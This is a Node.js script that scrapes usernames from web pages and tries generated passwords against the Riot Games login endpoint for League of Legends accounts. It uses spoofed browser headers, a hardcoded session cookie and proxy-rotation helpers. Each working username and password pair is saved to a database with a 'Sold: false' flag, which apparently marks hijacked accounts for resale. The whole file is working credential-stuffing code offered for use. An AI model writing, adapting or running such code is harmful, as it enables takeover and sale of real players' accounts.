/* eslint-disable no-await-in-loop */
const { uuid } = require('uuidv4');
const HttpsProxyAgent = require('https-proxy-agent');
const { Cookie, CookieJar } = require('tough-cookie');

const { NODE_ENV, RIOT_AUTH_URL, TEST_INTERVAL } = require('../commons/env');
const { getNNumbers } = require('../commons/numbers');
const { haveSameElements } = require('../commons/arrays');
const rollbar = require('../commons/rollbar');
const { getProxy, getProxyInfo } = require('../commons/proxy');
const { axios } = require('../commons/request');
const proxies = require('../constants/proxies');
const urls = require('../constants/urls');
const { getPasswordSet } = require('../constants/tests');
const { account } = require('../database/models');

const { getUsers } = require('./get_users');

const interval = +TEST_INTERVAL;
const requestInterval = 1000;
const minPageNum = 13;
const states = urls.map((url, i) => ({ url, pageNum: minPageNum + i, lastUsers: [] }));
let lastProxy = null;
const cookieHeader =
  '_ga=GA1.2.1863859218.1595491280; _gid=GA1.2.2059473310.1595491280; did=bfb4c5639e53489b9f762ca1ec601e0b; __cfduid=d0df7d2a3d3e2e095ee429f55593370a11595491831; clid=uw1; asid=IGz-OmcPPpCrV7uGCtmP8yoaWigdIbAcfMFiY9sQ1t4.3f4TIYoqfWQ%3D; __cf_bm=3a11c10e705526e8683f4d84e13c7128abe6491b-1595522248-1800-AfncLqFTGUon/FzjeiSb5ob+aa4d6FUt6JoXC2Gm7fTtzrO5p/8z4AJAwHpXhYwwwUmTEL2pjgdzCgWMnjV0R3s';
const getCookie = async proxy =>
  new Promise(async resolve => {
    // const { host, port } = proxy;
    const response = await axios({
      options: {
        method: 'post',
        url: RIOT_AUTH_URL,
        withCredentials: true,
        // proxy: { host, port, protocol: 'https' },
        // httpsAgent: new HttpsProxyAgent(`http://${host}:${port}`),
        headers: {
          'Content-Type': 'application/json',
          Accept: '*/*',
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
          Cookie: cookieHeader,
          Referrer: 'https://auth.riotgames.com/login',
          'Sec-Fetch-Dest:': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'User-Agent':
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
        },
        data: {
          client_id: 'rso-web-client-prod',
          login_hint: 'las',
          redirect_uri: 'https://login.leagueoflegends.com/oauth2-callback',
          response_type: 'code',
          scope: 'openid',
          state: uuid()
        }
      },
      persist: true
    });
    if (!response) return resolve(null);
    // TODO remove
    if (true === true) return resolve(response.headers['set-cookie'][0]);
    console.log('POST got', response.status);
    const cookie = Cookie.parse(response.headers['set-cookie'][0]);
    cookie.value = uuid();
    const cookiejar = new CookieJar();
    cookiejar.setCookie(cookie, RIOT_AUTH_URL, (error, data) => {
      if (error) rollbar.error(error);
      console.log(cookiejar);
      resolve(cookiejar);
    });
  });
const changeProxy = async () => {
  const proxy = getProxy();
  const { host, port } = getProxyInfo(proxy);
  if (proxy !== lastProxy) {
    lastProxy = proxy;
    await getCookie(proxy);
  }
  return { host, port, protocol: 'http' };
};
const testCredentials = async (url, username, password, proxyConfig, cookie) => {
  const options = {
    method: 'put',
    url: RIOT_AUTH_URL,
    withCredentials: true,
    proxy: proxyConfig,
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
      'Accept-Encoding': 'gzip, deflate, br',
      'accept-Language': 'en-US,en;q=0.9,es;q=0.8',
      Cookie: cookieHeader,
      Origin: 'https://auth.riotgames.com',
      Referrer: 'https://auth.riotgames.com/login',
      'Sec-Fetch-Dest:': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent':
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    },
    data: {
      language: 'es-ES',
      password,
      remember: false,
      type: 'auth',
      username
    }
  };
  const response = await axios({ options, persist: true });
  if (!response || response.status < 200 || response.status >= 300) return;
  console.log('PUT got', response.status);
  account.save({
    UserName: username,
    Password: password,
    FromUrl: url,
    Sold: false
  });
};
const requestUsers = async (url, state, cookie) => {
  console.log('GET', url);
  // User list request
  const userResp = await axios({ options: { url } });
  if (!userResp) return;
  const users = getUsers(userResp.body);
  if (haveSameElements(users, state.lastUsers)) {
    console.log('Same elements', users, state.lastUsers);
    state.pageNum = minPageNum;
    return;
  }
  for (let i = 0; i < users.length; i += 1) {}
  // console.log('Got Users from', url, users);
  state.lastUsers = users;
  state.pageNum += 1;
  let time = 2;
  for (let i = 0; i < users.length; i += 1) {
    const user = users[i];
    const passwords = getPasswordSet(user);
    // const proxyConfig = await changeProxy();
    for (let ii = 0; ii < passwords.length; ii += 1) {
      setTimeout(testCredentials, time, url, user, passwords[ii], undefined, cookie);
      time += requestInterval;
    }
  }
};

const execute = () =>
  setTimeout(async () => {
    const pages = getNNumbers(urls.length - 1);
    const cookie = await getCookie({});
    for (let i = 0; i < states.length; i += 1) {
      const state = states[i];
      const { pageNum, lastUsers } = states[i];
      const url = `${states[i].url}${states[i].pageNum}`;
      requestUsers(url, state, cookie);
    }
    execute();
  }, interval);

// if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
// execute();
